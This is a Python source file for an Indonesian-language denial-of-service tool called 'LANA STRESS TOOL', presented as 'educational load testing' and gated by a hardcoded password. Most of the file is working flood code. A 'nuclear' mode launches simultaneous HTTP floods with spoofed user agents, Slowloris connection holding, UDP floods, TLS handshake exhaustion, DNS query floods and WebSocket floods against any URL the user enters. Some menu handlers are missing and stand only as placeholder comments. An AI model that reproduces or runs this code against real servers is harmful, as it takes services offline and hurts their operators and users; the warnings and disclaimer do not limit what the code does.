import os
import time
import threading
import requests
import socket
import random
import ssl
import urllib3
from urllib.parse import urlparse
from getpass import getpass
import sys

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class Security:
    @staticmethod
    def check_access():
        os.system('clear' if os.name == 'posix' else 'cls')
        Security.display_ascii_art()
        
        attempts = 3
        while attempts > 0:
            print(f"\n{Color.CYAN}{Color.BOLD}🔐 SISTEM KEAMANAN TOOLS{Color.END}")
            print(f"{Color.YELLOW}Masukkan kode akses (Attempts left: {attempts}):{Color.END}", end=" ")
            password = getpass("")
            
            if password == "Lana":
                print(f"\n{Color.GREEN}✅ Akses Diberikan! Memuat tools...{Color.END}")
                time.sleep(2)
                return True
            else:
                attempts -= 1
                print(f"{Color.RED}❌ Kode akses salah!{Color.END}")
                time.sleep(1)
        
        print(f"\n{Color.RED}{Color.BOLD}🚫 Akses Ditolak! Program dihentikan.{Color.END}")
        return False
    
    @staticmethod
    def display_ascii_art():
        ascii_art = f"""
{Color.MAGENTA}{Color.BOLD}
╦  ╦┬ ┬┌─┐┌─┐┬┌─   ╔═╗┌─┐┌┬┐┌─┐
╚╗╔╝├─┤├┤ │  ├┴┐   ╠═╝├┤  │ ├┤ 
 ╚╝ ┴ ┴└─┘└─┘┴ ┴   ╩  └─┘ ┴ └─┘
{Color.END}
{Color.CYAN}
•▄▄▄▄  ▪  ▄▄· ▄▄▄▄▄▪  ·▄▄▄▄  
██▪ ██ ██ ▐█ ▌▪•██  ██ ██▪ ██ 
▐█· ▐█▌▐█·██ ▄▄ ▐█.▪▐█·▐█· ▐█▌
██. ██ ▐█▌▐███▌ ▐█▌·▐█▌██. ██ 
▀▀▀▀▀• ▀▀▀·▀▀▀  ▀▀▀ ▀▀▀▀▀▀▀▀• 
{Color.END}
        """
        print(ascii_art)

class NuclearAttack:
    def __init__(self):
        self.stats = {
            'total_attacks': 0,
            'start_time': 0,
            'active_threads': 0
        }
        self.running = False
        self.attack_methods = []

    def nuclear_combo_attack(self, target_url, total_threads=500, duration=60):
        """NUCLEAR COMBINATION ATTACK - Method Terkuat"""
        print(f"\n{Color.RED}{Color.BOLD}💣 MEMULAI NUCLEAR COMBINATION ATTACK!{Color.END}")
        print(f"{Color.RED}🚨 METHOD PALING POWERFUL - GUNAKAN DENGAN SANGAT HATI-HATI!{Color.END}")
        
        self.running = True
        self.stats = {'total_attacks': 0, 'start_time': time.time(), 'active_threads': 0}
        parsed = urlparse(target_url)
        host = parsed.hostname
        
        # Start semua metode secara bersamaan
        threads = []
        
        # 1. Mega HTTP Flood
        print(f"{Color.YELLOW}🔥 Menjalankan MEGA HTTP FLOOD...{Color.END}")
        for i in range(total_threads // 4):
            t = threading.Thread(target=self._mega_http_flood, args=(target_url, i))
            threads.append(t)
            t.start()
        
        # 2. Advanced Slowloris
        print(f"{Color.YELLOW}🔥 Menjalankan ADVANCED SLOWLORIS...{Color.END}")
        for i in range(5):  # 5 slowloris controllers
            t = threading.Thread(target=self._advanced_slowloris, args=(host, 50, duration))
            threads.append(t)
            t.start()
        
        # 3. UDP Amplification
        print(f"{Color.YELLOW}🔥 Menjalankan UDP AMPLIFICATION...{Color.END}")
        for i in range(10):
            t = threading.Thread(target=self._udp_amplification, args=(host, duration))
            threads.append(t)
            t.start()
        
        # 4. SSL/TLS Exhaustion
        print(f"{Color.YELLOW}🔥 Menjalankan SSL/TLS EXHAUSTION...{Color.END}")
        for i in range(20):
            t = threading.Thread(target=self._ssl_exhaustion, args=(host, duration))
            threads.append(t)
            t.start()
        
        # 5. DNS Amplification
        print(f"{Color.YELLOW}🔥 Menjalankan DNS AMPLIFICATION...{Color.END}")
        for i in range(10):
            t = threading.Thread(target=self._dns_amplification, args=(host, duration))
            threads.append(t)
            t.start()
        
        # 6. WebSocket Flood
        print(f"{Color.YELLOW}🔥 Menjalankan WEBSOCKET FLOOD...{Color.END}")
        for i in range(15):
            t = threading.Thread(target=self._websocket_flood, args=(target_url, duration))
            threads.append(t)
            t.start()
        
        # Progress monitoring
        self._nuclear_progress(duration)
        
        # Cleanup
        self.running = False
        print(f"\n{Color.GREEN}✅ Nuclear Attack Completed!{Color.END}")
        self._nuclear_summary()

    def _mega_http_flood(self, url, thread_id):
        """Enhanced HTTP Flood dengan multiple techniques"""
        headers_list = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}
        ]
        
        post_data = {
            'username': 'test',
            'password': 'test123',
            'email': 'test@test.com',
            'data': 'x' * 1000  # Large payload
        }
        
        while self.running:
            try:
                # Alternate between GET and POST
                if random.choice([True, False]):
                    response = requests.get(
                        url, 
                        headers=random.choice(headers_list),
                        timeout=5,
                        verify=False
                    )
                else:
                    response = requests.post(
                        url,
                        data=post_data,
                        headers=random.choice(headers_list),
                        timeout=5,
                        verify=False
                    )
                
                self.stats['total_attacks'] += 1
                print(f"{Color.GREEN}⚡ HTTP[{thread_id}]: {response.status_code}{Color.END}")
                
            except Exception as e:
                self.stats['total_attacks'] += 1
                print(f"{Color.RED}💥 HTTP[{thread_id}]: Error - {e}{Color.END}")

    def _advanced_slowloris(self, host, num_sockets, duration):
        """Enhanced Slowloris dengan lebih banyak sockets"""
        port = 80
        sockets = []
        
        try:
            while self.running and time.time() - self.stats['start_time'] < duration:
                # Create new sockets
                while len(sockets) < num_sockets and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((host, port))
                        
                        # Send partial headers
                        sock.send(f"POST / HTTP/1.1\r\nHost: {host}\r\n".encode())
                        sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send(f"Content-Length: 1000000\r\n".encode())
                        
                        sockets.append(sock)
                        self.stats['total_attacks'] += 1
                        print(f"{Color.CYAN}🐌 Slowloris: Socket {len(sockets)} aktif{Color.END}")
                        
                    except Exception as e:
                        break
                
                # Keep sockets alive
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-Header: {random.randint(1000, 9999)}\r\n".encode())
                        time.sleep(random.uniform(10, 30))  # Very slow
                    except:
                        sockets.remove(sock)
                
                time.sleep(1)
                
        finally:
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

    def _udp_amplification(self, host, duration):
        """UDP Amplification attack"""
        packet_count = 0
        data = random._urandom(1450)  # Maximum UDP packet size
        
        while self.running and time.time() - self.stats['start_time'] < duration:
            try:
                # Try multiple ports
                for port in [80, 443, 53, 123, 161, 1900, 5353]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(data, (host, port))
                    sock.close()
                    
                    packet_count += 1
                    self.stats['total_attacks'] += 1
                    
                    if packet_count % 100 == 0:
                        print(f"{Color.MAGENTA}🌊 UDP Amp: {packet_count} packets{Color.END}")
                        
            except Exception as e:
                print(f"{Color.RED}💥 UDP Error: {e}{Color.END}")

    def _ssl_exhaustion(self, host, duration):
        """SSL/TLS Handshake Exhaustion"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.running and time.time() - self.stats['start_time'] < duration:
            try:
                # SSL connection attempts
                for port in [443, 8443, 9443]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    ssl_sock = context.wrap_socket(sock, server_hostname=host)
                    
                    try:
                        ssl_sock.connect((host, port))
                        # Keep connection open briefly
                        time.sleep(2)
                        ssl_sock.close()
                        
                        self.stats['total_attacks'] += 1
                        print(f"{Color.YELLOW}🔐 SSL Exhaustion: Port {port}{Color.END}")
                        
                    except:
                        pass
                        
            except Exception as e:
                print(f"{Color.RED}💥 SSL Error: {e}{Color.END}")

    def _dns_amplification(self, host, duration):
        """DNS Query Flood"""
        dns_queries = [
            b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
            b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
        ]
        
        while self.running and time.time() - self.stats['start_time'] < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for query in dns_queries:
                    sock.sendto(query, (host, 53))
                    self.stats['total_attacks'] += 1
                sock.close()
                print(f"{Color.BLUE}📡 DNS Amp: Query sent{Color.END}")
                time.sleep(0.1)
                
            except Exception as e:
                print(f"{Color.RED}💥 DNS Error: {e}{Color.END}")

    def _websocket_flood(self, url, duration):
        """WebSocket Connection Flood"""
        ws_headers = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13'
        }
        
        while self.running and time.time() - self.stats['start_time'] < duration:
            try:
                response = requests.get(url, headers=ws_headers, timeout=5, verify=False)
                self.stats['total_attacks'] += 1
                print(f"{Color.WHITE}🔗 WebSocket: Attempt {self.stats['total_attacks']}{Color.END}")
                time.sleep(0.5)
                
            except Exception as e:
                self.stats['total_attacks'] += 1
                print(f"{Color.RED}💥 WS Error: {e}{Color.END}")

    def _nuclear_progress(self, duration):
        """Nuclear attack progress monitor"""
        print(f"\n{Color.RED}{Color.BOLD}💀 NUCLEAR ATTACK IN PROGRESS!{Color.END}")
        for i in range(duration):
            if not self.running:
                break
            progress = (i + 1) / duration * 100
            bar = "█" * int(progress / 2) + "░" * (50 - int(progress / 2))
            attacks_per_sec = self.stats['total_attacks'] / (i + 1) if i > 0 else 0
            print(f"\r{Color.RED}[{bar}] {progress:.1f}% | Total Attacks: {self.stats['total_attacks']} | APS: {attacks_per_sec:.1f}{Color.END}", end="", flush=True)
            time.sleep(1)
        print()

    def _nuclear_summary(self):
        """Nuclear attack summary"""
        total_time = time.time() - self.stats['start_time']
        aps = self.stats['total_attacks'] / total_time if total_time > 0 else 0
        
        print(f"\n{Color.RED}{Color.BOLD}")
        print("╔══════════════════════════════════════════════╗")
        print("║             💀 NUCLEAR SUMMARY 💀            ║")
        print("╠══════════════════════════════════════════════╣")
        print(f"║ Total Attacks: {self.stats['total_attacks']:>26} ║")
        print(f"║ Duration: {total_time:>32.1f}s ║")
        print(f"║ Attacks/Second: {aps:>26.1f} ║")
        print("║                                              ║")
        print("║           🚨 MAXIMUM IMPACT ACHIEVED 🚨     ║")
        print("╚══════════════════════════════════════════════╝")
        print(Color.END)

class LoadTester:
    def __init__(self):
        self.nuclear = NuclearAttack()
        self.stats = {
            'requests_sent': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0
        }
        self.running = False
    
    def nuclear_attack(self, target_url, total_threads=500, duration=60):
        """NUCLEAR COMBINATION ATTACK - METHOD TERKUAT"""
        return self.nuclear.nuclear_combo_attack(target_url, total_threads, duration)
    
    # [Method-metode sebelumnya tetap ada di sini: http_flood, slowloris, udp_flood, mixed_attack]
    # ... (kode methods sebelumnya tetap sama)

class Menu:
    def __init__(self):
        self.tester = LoadTester()
    
    def display_main_menu(self):
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"""
{Color.MAGENTA}{Color.BOLD}
╔══════════════════════════════════════════════╗
║             🛡️ LANA STRESS TOOL 🛡️            ║
║         Educational Load Testing Suite       ║
╚══════════════════════════════════════════════╝
{Color.END}

{Color.CYAN}PILIH METODE ATTACK:{Color.END}

{Color.GREEN}1. HTTP Flood Attack {Color.YELLOW}(Level 1 - Ringan){Color.END}

{Color.YELLOW}2. Slowloris Attack {Color.RED}(Level 2 - Menengah){Color.END}

{Color.RED}3. UDP Flood Attack {Color.MAGENTA}(Level 3 - Berat){Color.END}

{Color.MAGENTA}4. Mixed Advanced Attack {Color.BOLD}{Color.RED}(Level 4 - Extreme){Color.END}

{Color.RED}{Color.BOLD}5. 💀 NUCLEAR COMBINATION ATTACK {Color.RED}(LEVEL 5 - APOCALYPSE){Color.END}
   • 🔥 Kombinasi SEMUA metode advanced
   • 💣 HTTP Flood + Slowloris + UDP Amplification
   • 🔐 SSL Exhaustion + DNS Amplification  
   • 🌪️ WebSocket Flood + Multi-vector
   • 🚀 Maximum resource consumption
   • ⚡ 500+ threads simultaneously

{Color.WHITE}6. Keluar{Color.END}
            """)
            
            choice = input(f"\n{Color.CYAN}Pilih metode (1-6): {Color.END}").strip()
            
            if choice == '1':
                self.http_flood_menu()
            elif choice == '2':
                self.slowloris_menu()
            elif choice == '3':
                self.udp_flood_menu()
            elif choice == '4':
                self.mixed_attack_menu()
            elif choice == '5':
                self.nuclear_attack_menu()
            elif choice == '6':
                print(f"\n{Color.GREEN}Terima kasih! Gunakan dengan bijak. 👋{Color.END}")
                break
            else:
                print(f"{Color.RED}Pilihan tidak valid!{Color.END}")
                time.sleep(1)
    
    def nuclear_attack_menu(self):
        print(f"\n{Color.RED}{Color.BOLD}💀 NUCLEAR COMBINATION ATTACK{Color.END}")
        print(f"{Color.RED}🚨🚨🚨 PERINGATAN TERTINGGI! 🚨🚨🚨{Color.END}")
        print(f"{Color.RED}Method ini dapat:{Color.END}")
        print(f"{Color.RED}• Mengonsumsi semua resource sistem{Color.END}")
        print(f"{Color.RED}• Membebani jaringan internet lokal{Color.END}")
        print(f"{Color.RED}• Dapat di-deteksi oleh ISP{Color.END}")
        print(f"{Color.RED}• HANYA untuk server testing khusus!{Color.END}")
        
        target = input("\nTarget URL (HARUS server sendiri): ").strip()
        threads = int(input("Total threads (100-2000): ") or "500")
        duration = int(input("Durasi (detik): ") or "60")
        
        confirm = input(f"\n{Color.RED}YAKIN 100% ingin menjalankan NUCLEAR ATTACK? (y/N): {Color.END}").lower()
        
        if confirm == 'y':
            final_confirm = input(f"{Color.RED}FINAL WARNING! Ini BISA BERBAHAYA! Ketik 'CONFIRM-NUCLEAR': {Color.END}")
            if final_confirm == 'CONFIRM-NUCLEAR':
                self.tester.nuclear_attack(target, threads, duration)
            else:
                print(f"{Color.YELLOW}Nuclear attack dibatalkan!{Color.END}")
        else:
            print(f"{Color.YELLOW}Attack dibatalkan!{Color.END}")
        
        input(f"\n{Color.CYAN}Press Enter untuk kembali...{Color.END}")

    # [Method-menu lainnya tetap sama]
    # ... (menu methods sebelumnya)

def main():
    # Disclaimer Legal yang lebih strict
    print(f"""
{Color.RED}{Color.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                       ⚠️  EXTREME WARNING ⚠️                   ║
║══════════════════════════════════════════════════════════════║
║  NUCLEAR ATTACK METHODS DITAMBAHKAN - EXTREME DANGER!       ║
║                                                            ║
║  🚫 DILARANG KERAS untuk:                                  ║
║     • Semua website/organisasi                             ║
║     • Infrastructure apapun                                ║
║     • Testing tanpa izin                                   ║
║                                                            ║
║  ✅ HANYA UNTUK:                                            ║
║     • Academic research dengan supervision                 ║
║     • Penetration testing LAB environment                  ║
║     • Server dedicated testing khusus                     ║
║                                                            ║
║  ⚖️  KONSEKUENSI LEGAL:                                     ║
║     • Tindakan kriminal berat                              ║
║     • Sanksi internasional                                ║
║     • Hukuman maksimum                                     ║
╚══════════════════════════════════════════════════════════════╝
{Color.END}
    """)
    
    if Security.check_access():
        menu = Menu()
        menu.display_main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}Program dihentikan oleh user.{Color.END}")
    except Exception as e:
        print(f"\n{Color.RED}Error: {str(e)}{Color.END}")
